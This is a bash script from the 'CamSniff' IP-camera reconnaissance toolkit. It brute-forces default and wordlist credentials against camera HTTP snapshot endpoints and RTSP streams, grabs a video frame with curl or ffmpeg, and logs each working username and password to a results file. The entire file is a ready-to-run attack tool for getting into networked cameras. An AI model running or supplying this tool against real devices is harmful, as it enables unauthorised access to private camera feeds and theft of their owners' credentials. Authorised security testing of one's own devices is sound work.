#!/usr/bin/env bash
#
# CamSniff- Automated IP camera reconnaissance toolkit
# By John Hauger Mitander <john@on1.no>
# Copyright 2025 John Hauger Mitander
#
# SPDX-License-Identifier: MIT
# credential-probe.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

INPUT_JSON=""
USERNAMES_FILE="$ROOT_DIR/data/usernames.txt"
PASSWORDS_FILE="$ROOT_DIR/data/passwords.txt"
HTTP_PATHS_FILE="$ROOT_DIR/data/http-paths.txt"
MODE="medium"
OUTPUT_JSON="$ROOT_DIR/dev/results/credentials.json"
THUMB_DIR="$ROOT_DIR/dev/results/thumbnails"
LOG_DIR="$ROOT_DIR/dev/results/logs"

print_usage() {
    cat <<'EOF'
Usage: credential-probe.sh --input devices.json [--mode <mode>] [--usernames file] [--passwords file] \
                           [--output credentials.json] [--thumbnails dir]
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --input)
            INPUT_JSON="${2:-}"
            shift 2
            ;;
        --mode|-m)
            MODE="${2:-}"
            shift 2
            ;;
        --usernames)
            USERNAMES_FILE="${2:-}"
            shift 2
            ;;
        --passwords)
            PASSWORDS_FILE="${2:-}"
            shift 2
            ;;
        --http-paths)
            HTTP_PATHS_FILE="${2:-}"
            shift 2
            ;;
        --output)
            OUTPUT_JSON="${2:-}"
            shift 2
            ;;
        --thumbnails)
            THUMB_DIR="${2:-}"
            shift 2
            ;;
        --log-dir)
            LOG_DIR="${2:-}"
            shift 2
            ;;
        -h|--help)
            print_usage
            exit 0
            ;;
        *)
            echo "Unknown option: $1" >&2
            print_usage >&2
            exit 1
            ;;
    esac
done

[[ -f "$INPUT_JSON" ]] || { echo "Input JSON not found: $INPUT_JSON" >&2; exit 1; }
[[ -f "$USERNAMES_FILE" ]] || { echo "Username list missing: $USERNAMES_FILE" >&2; exit 1; }
[[ -f "$PASSWORDS_FILE" ]] || { echo "Password list missing: $PASSWORDS_FILE" >&2; exit 1; }

HTTP_FALLBACKS=()
if [[ -f "$HTTP_PATHS_FILE" ]]; then
    while IFS= read -r line; do
        line=${line%%#*}
        line=$(printf '%s' "$line" | sed 's/^\s*//;s/\s*$//')
        [[ -z $line ]] && continue
        HTTP_FALLBACKS+=("$line")
    done < "$HTTP_PATHS_FILE"
else
    HTTP_FALLBACKS=(
        "http://{{username}}:{{password}}@{{ip_address}}/snapshot.jpg|80|1|0|generic snapshot"
        "http://{{username}}:{{password}}@{{ip_address}}/image.jpg|80|1|0|generic image"
        "http://{{username}}:{{password}}@{{ip_address}}/cgi-bin/snapshot.cgi|80|1|0|generic cgi"
    )
fi

mkdir -p "$(dirname "$OUTPUT_JSON")" "$THUMB_DIR" "$LOG_DIR"

# Load mode configuration
if ! mode_env_output="$("$SCRIPT_DIR/mode-config.sh" --mode "$MODE" --format export)"; then
    echo "Failed to resolve mode configuration" >&2
    exit 1
fi
eval "$mode_env_output"
unset mode_env_output

readarray -t USERNAME_LIST < <(grep -vE '^\s*(#|$)' "$USERNAMES_FILE" | sed 's/\r$//')
readarray -t PASSWORD_LIST < <(grep -vE '^\s*(#|$)' "$PASSWORDS_FILE" | sed 's/\r$//')

MAX_CREDENTIALS=${CAM_MODE_MAX_CREDENTIALS:-32}
CURL_TIMEOUT=${CAM_MODE_CURL_TIMEOUT:-8}
FFMPEG_TIMEOUT=${CAM_MODE_FFMPEG_TIMEOUT:-10}
HTTP_RETRIES=${CAM_MODE_HTTP_RETRIES:-2}
FALLBACK_HTTP_CRED_LIMIT=6

render_template() {
    local template="$1"
    local ip="$2"
    local username="$3"
    local password="$4"
    local port="$5"
    local channel="$6"
    local stream="$7"
    local result="$template"
    result="${result//\{\{ip_address\}\}/$ip}"
    result="${result//\{\{username\}\}/${username}}"
    result="${result//\{\{password\}\}/${password}}"
    result="${result//\{\{port\}\}/${port}}"
    result="${result//\{\{channel\}\}/${channel}}"
    result="${result//\{\{stream\}\}/${stream}}"
    echo "$result"
}

apply_credentials_to_url() {
    local url="$1"
    local username="$2"
    local password="$3"

    [[ -z $username ]] && { echo "$url"; return; }
    [[ $url != *"://"* ]] && { echo "$url"; return; }

    local scheme="${url%%://*}"
    local rest="${url#*://}"
    local host_part="${rest%%/*}"
    if [[ $host_part == *"@"* ]]; then
        echo "$url"
        return
    fi

    local auth="$username"
    [[ -n $password ]] && auth+=":$password"
    echo "${scheme}://${auth}@${rest}"
}

trim_auth_in_url() {
    local url="$1"
    if [[ $url =~ ^rtsp://:@ ]]; then
        echo "rtsp://${url#rtsp://:@}"
    elif [[ $url =~ ^http://:@ ]]; then
        echo "http://${url#http://:@}"
    else
        echo "$url"
    fi
}

build_credentials() {
    local defaults_user="$1"
    local defaults_pass="$2"
    local max_entries="$3"
    declare -A seen=()
    local -a creds=()

    add_cred() {
        local user="$1"
        local pass="$2"
        local key="$user|$pass"
        if [[ -z ${seen[$key]+set} ]]; then
            seen[$key]=1
            creds+=("$user|$pass")
        fi
    }

    if [[ -n $defaults_user || -n $defaults_pass ]]; then
        add_cred "$defaults_user" "$defaults_pass"
        add_cred "$defaults_user" ""
    fi
    add_cred "" ""

    for pass in "${PASSWORD_LIST[@]}"; do
        [[ ${#creds[@]} -ge $max_entries ]] && break
        if [[ -n $defaults_user ]]; then
            add_cred "$defaults_user" "$pass"
        fi
    done

    for user in "${USERNAME_LIST[@]}"; do
        [[ ${#creds[@]} -ge $max_entries ]] && break
        if [[ -n $defaults_pass ]]; then
            add_cred "$user" "$defaults_pass"
        fi
    done

    for user in "${USERNAME_LIST[@]}"; do
        for pass in "${PASSWORD_LIST[@]}"; do
            [[ ${#creds[@]} -ge $max_entries ]] && break 2
            add_cred "$user" "$pass"
        done
    done

    printf '%s\n' "${creds[@]}"
}

attempt_http_snapshot() {
    local url="$1"
    local username="$2"
    local password="$3"
    local ip="$4"
    local out_file="$5"
    local log_file="$6"

    local auth_opts=()
    if [[ -n $username || -n $password ]]; then
        auth_opts+=("--user" "$username:$password")
    fi

    local http_code
    http_code=$(curl -m "$CURL_TIMEOUT" --connect-timeout "$CURL_TIMEOUT" --retry "$HTTP_RETRIES" --retry-delay 1 \
        --retry-connrefused --silent --show-error --output "$out_file" --write-out '%{http_code}' \
        "${auth_opts[@]}" "$url" 2>"$log_file") || return 1

    [[ $http_code == "200" ]] || return 1
    local size
    size=$(stat -c%s "$out_file" 2>/dev/null || echo 0)
    [[ $size -gt 512 ]] || return 1
    return 0
}

attempt_rtsp_snapshot() {
    local url="$1"
    local ip="$2"
    local out_file="$3"
    local log_file="$4"

    ffmpeg -loglevel error -nostdin -rtsp_transport tcp -stimeout "$((FFMPEG_TIMEOUT * 1000000))" \
        -y -i "$url" -frames:v 1 "$out_file" >"$log_file" 2>&1 || return 1
    local size
    size=$(stat -c%s "$out_file" 2>/dev/null || echo 0)
    [[ $size -gt 1024 ]]
}

make_ascii_preview() {
    local image="$1"
    local output_txt="$2"
    if command -v chafa >/dev/null 2>&1; then
        chafa --size=80x24 "$image" > "$output_txt" 2>/dev/null || true
    fi
}

HOSTS_TMP=$(mktemp)
RESULTS_TMP=$(mktemp)
trap 'rm -f "$HOSTS_TMP" "$RESULTS_TMP"' EXIT

jq -c '.hosts[]' "$INPUT_JSON" > "$HOSTS_TMP"

while IFS= read -r host_json; do
    ip=$(jq -r '.ip' <<<"$host_json")
    vendor=$(jq -r '.profile_match.vendor // "Unknown"' <<<"$host_json")
    model=$(jq -r '.profile_match.model // "Unknown"' <<<"$host_json")
    matched_by=$(jq -r '.profile_match.matched_by // "unknown"' <<<"$host_json")
    default_user=$(jq -r '.profile_match.default_username // ""' <<<"$host_json")
    default_pass=$(jq -r '.profile_match.default_password // ""' <<<"$host_json")

    protocols_json=$(jq -c '.additional_protocols // []' <<<"$host_json")
    [[ -z $protocols_json ]] && protocols_json='[]'

    readarray -t rtsp_candidates < <(jq -c '.profile_match.rtsp_candidates[]?' <<<"$host_json")
    readarray -t http_candidates < <(jq -c '.profile_match.http_snapshot_candidates[]?' <<<"$host_json")
    readarray -t brute_rtsp_hits < <(jq -r '.rtsp_bruteforce.discovered[]?' <<<"$host_json")

    if [[ ${#rtsp_candidates[@]} -eq 0 && ${#http_candidates[@]} -eq 0 && ${#brute_rtsp_hits[@]} -eq 0 && ${#HTTP_FALLBACKS[@]} -eq 0 ]]; then
        continue
    fi

    readarray -t credentials < <(build_credentials "$default_user" "$default_pass" "$MAX_CREDENTIALS")

    declare -A attempted_http=()
    declare -A attempted_rtsp=()

    success=false
    success_payload=""
    attempt=0

    for credential in "${credentials[@]}"; do
        IFS='|' read -r cred_user cred_pass <<<"$credential"
        (( attempt += 1 ))

        for http_candidate in "${http_candidates[@]}"; do
            channel=$(jq -r '.channel // "1"' <<<"$http_candidate")
            stream=$(jq -r '.stream // "0"' <<<"$http_candidate")
            template=$(jq -r '.template' <<<"$http_candidate")
            port=$(jq -r '.port // 80' <<<"$http_candidate")
            key="http|$template|$port|$channel|$stream"
            if [[ -n ${attempted_http[$key]+set} ]]; then
                continue
            fi
            attempted_http[$key]=1
            origin="profile"
            url=$(render_template "$template" "$ip" "$cred_user" "$cred_pass" "$port" "$channel" "$stream")
            url=$(trim_auth_in_url "$url")
            snapshot_file="$THUMB_DIR/${ip//[^a-zA-Z0-9._-]/_}_http.jpg"
            log_file="$LOG_DIR/${ip//[^a-zA-Z0-9._-]/_}_http.log"
            if attempt_http_snapshot "$url" "$cred_user" "$cred_pass" "$ip" "$snapshot_file" "$log_file"; then
                ascii_file="$THUMB_DIR/${ip//[^a-zA-Z0-9._-]/_}_http.txt"
                make_ascii_preview "$snapshot_file" "$ascii_file"
                timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
                success_payload=$(jq -n \
                    --arg ip "$ip" \
                    --arg method "http_snapshot" \
                    --arg origin "$origin" \
                    --arg url "$url" \
                    --arg username "$cred_user" \
                    --arg password "$cred_pass" \
                    --arg vendor "$vendor" \
                    --arg model "$model" \
                    --arg matched_by "$matched_by" \
                    --arg snapshot "$snapshot_file" \
                    --arg ascii "$ascii_file" \
                    --arg timestamp "$timestamp" \
                    --argjson protocols "$protocols_json" \
                    '{
                        ip: $ip,
                        method: $method,
                        origin: $origin,
                        vendor: $vendor,
                        model: $model,
                        matched_by: $matched_by,
                        credentials: {username: $username, password: $password},
                        artifact: {snapshot: $snapshot, ascii_preview: $ascii},
                        url: $url,
                        timestamp: $timestamp,
                        protocols: $protocols
                    }')
                success=true
                break 2
            fi
        done

        if (( attempt <= FALLBACK_HTTP_CRED_LIMIT )); then
            for fallback in "${HTTP_FALLBACKS[@]}"; do
                IFS='|' read -r fallback_template fallback_port fallback_channel fallback_stream fallback_label <<<"$fallback"
                [[ -z $fallback_template ]] && continue
                fallback_port=${fallback_port:-80}
                fallback_channel=${fallback_channel:-1}
                fallback_stream=${fallback_stream:-0}
                key="http|$fallback_template|$fallback_port|$fallback_channel|$fallback_stream"
                if [[ -n ${attempted_http[$key]+set} ]]; then
                    continue
                fi
                attempted_http[$key]=1
                origin="fallback${fallback_label:+:$fallback_label}"
                url=$(render_template "$fallback_template" "$ip" "$cred_user" "$cred_pass" "$fallback_port" "$fallback_channel" "$fallback_stream")
                url=$(trim_auth_in_url "$url")
                suffix=${fallback_label//[^a-zA-Z0-9]/_}
                suffix=${suffix:-generic}
                snapshot_file="$THUMB_DIR/${ip//[^a-zA-Z0-9._-]/_}_http_${suffix}.jpg"
                log_file="$LOG_DIR/${ip//[^a-zA-Z0-9._-]/_}_http_${suffix}.log"
                if attempt_http_snapshot "$url" "$cred_user" "$cred_pass" "$ip" "$snapshot_file" "$log_file"; then
                    ascii_file="$THUMB_DIR/${ip//[^a-zA-Z0-9._-]/_}_http_${suffix}.txt"
                    make_ascii_preview "$snapshot_file" "$ascii_file"
                    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
                    success_payload=$(jq -n \
                        --arg ip "$ip" \
                        --arg method "http_snapshot" \
                        --arg origin "$origin" \
                        --arg url "$url" \
                        --arg username "$cred_user" \
                        --arg password "$cred_pass" \
                        --arg vendor "$vendor" \
                        --arg model "$model" \
                        --arg matched_by "$matched_by" \
                        --arg snapshot "$snapshot_file" \
                        --arg ascii "$ascii_file" \
                        --arg timestamp "$timestamp" \
                        --argjson protocols "$protocols_json" \
                        '{
                            ip: $ip,
                            method: $method,
                            origin: $origin,
                            vendor: $vendor,
                            model: $model,
                            matched_by: $matched_by,
                            credentials: {username: $username, password: $password},
                            artifact: {snapshot: $snapshot, ascii_preview: $ascii},
                            url: $url,
                            timestamp: $timestamp,
                            protocols: $protocols
                        }')
                    success=true
                    break 2
                fi
            done
        fi

        for rtsp_candidate in "${rtsp_candidates[@]}"; do
            channel=$(jq -r '.channel // "1"' <<<"$rtsp_candidate")
            stream=$(jq -r '.stream // "0"' <<<"$rtsp_candidate")
            template=$(jq -r '.template' <<<"$rtsp_candidate")
            port=$(jq -r '.port // 554' <<<"$rtsp_candidate")
            transport=$(jq -r '.transport // "tcp"' <<<"$rtsp_candidate")
            key="rtsp|$template|$port|$channel|$stream"
            if [[ -n ${attempted_rtsp[$key]+set} ]]; then
                continue
            fi
            attempted_rtsp[$key]=1
            url=$(render_template "$template" "$ip" "$cred_user" "$cred_pass" "$port" "$channel" "$stream")
            url=$(trim_auth_in_url "$url")
            snapshot_file="$THUMB_DIR/${ip//[^a-zA-Z0-9._-]/_}_rtsp.jpg"
            log_file="$LOG_DIR/${ip//[^a-zA-Z0-9._-]/_}_rtsp.log"
            if attempt_rtsp_snapshot "$url" "$ip" "$snapshot_file" "$log_file"; then
                ascii_file="$THUMB_DIR/${ip//[^a-zA-Z0-9._-]/_}_rtsp.txt"
                make_ascii_preview "$snapshot_file" "$ascii_file"
                timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
                success_payload=$(jq -n \
                    --arg ip "$ip" \
                    --arg method "rtsp_stream" \
                    --arg origin "profile" \
                    --arg url "$url" \
                    --arg username "$cred_user" \
                    --arg password "$cred_pass" \
                    --arg vendor "$vendor" \
                    --arg model "$model" \
                    --arg matched_by "$matched_by" \
                    --arg snapshot "$snapshot_file" \
                    --arg ascii "$ascii_file" \
                    --arg transport "$transport" \
                    --arg timestamp "$timestamp" \
                    --argjson protocols "$protocols_json" \
                    '{
                        ip: $ip,
                        method: $method,
                        origin: $origin,
                        vendor: $vendor,
                        model: $model,
                        matched_by: $matched_by,
                        transport: $transport,
                        credentials: {username: $username, password: $password},
                        artifact: {snapshot: $snapshot, ascii_preview: $ascii},
                        url: $url,
                        timestamp: $timestamp,
                        protocols: $protocols
                    }')
                success=true
                break 2
            fi
        done

        for discovered_url in "${brute_rtsp_hits[@]}"; do
            [[ -z $discovered_url ]] && continue
            key="rtsp|discovered|$discovered_url"
            if [[ -n ${attempted_rtsp[$key]+set} ]]; then
                continue
            fi
            attempted_rtsp[$key]=1
            url=$(apply_credentials_to_url "$discovered_url" "$cred_user" "$cred_pass")
            url=$(trim_auth_in_url "$url")
            suffix=$(printf '%s' "$discovered_url" | sha1sum | awk '{print $1}' | cut -c1-10)
            snapshot_file="$THUMB_DIR/${ip//[^a-zA-Z0-9._-]/_}_rtsp_${suffix}.jpg"
            log_file="$LOG_DIR/${ip//[^a-zA-Z0-9._-]/_}_rtsp_${suffix}.log"
            if attempt_rtsp_snapshot "$url" "$ip" "$snapshot_file" "$log_file"; then
                ascii_file="$THUMB_DIR/${ip//[^a-zA-Z0-9._-]/_}_rtsp_${suffix}.txt"
                make_ascii_preview "$snapshot_file" "$ascii_file"
                timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
                success_payload=$(jq -n \
                    --arg ip "$ip" \
                    --arg method "rtsp_stream" \
                    --arg origin "rtsp-bruteforce" \
                    --arg url "$url" \
                    --arg username "$cred_user" \
                    --arg password "$cred_pass" \
                    --arg vendor "$vendor" \
                    --arg model "$model" \
                    --arg matched_by "$matched_by" \
                    --arg snapshot "$snapshot_file" \
                    --arg ascii "$ascii_file" \
                    --arg timestamp "$timestamp" \
                    --arg discovered "$discovered_url" \
                    --argjson protocols "$protocols_json" \
                    '{
                        ip: $ip,
                        method: $method,
                        origin: $origin,
                        vendor: $vendor,
                        model: $model,
                        matched_by: $matched_by,
                        transport: "unknown",
                        credentials: {username: $username, password: $password},
                        artifact: {snapshot: $snapshot, ascii_preview: $ascii},
                        url: $url,
                        timestamp: $timestamp,
                        protocols: $protocols,
                        discovered_source: $discovered
                    }')
                success=true
                break 2
            fi
        done

        [[ $attempt -ge $MAX_CREDENTIALS ]] && break
    done

    if [[ $success == true ]]; then
        printf '%s\n' "$success_payload" >> "$RESULTS_TMP"
    else
        timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        failure_payload=$(jq -n \
            --arg ip "$ip" \
            --arg vendor "$vendor" \
            --arg model "$model" \
            --arg matched_by "$matched_by" \
            --arg attempts "$attempt" \
            --arg timestamp "$timestamp" \
            --argjson protocols "$protocols_json" \
            '{
                ip: $ip,
                success: false,
                vendor: $vendor,
                model: $model,
                matched_by: $matched_by,
                attempts: ($attempts|tonumber),
                timestamp: $timestamp,
                protocols: $protocols
            }')
        printf '%s\n' "$failure_payload" >> "$RESULTS_TMP"
    fi

done < "$HOSTS_TMP"

if [[ -s "$RESULTS_TMP" ]]; then
    jq -s '.' "$RESULTS_TMP" > "$OUTPUT_JSON"
else
    echo '[]' > "$OUTPUT_JSON"
fi

exit 0
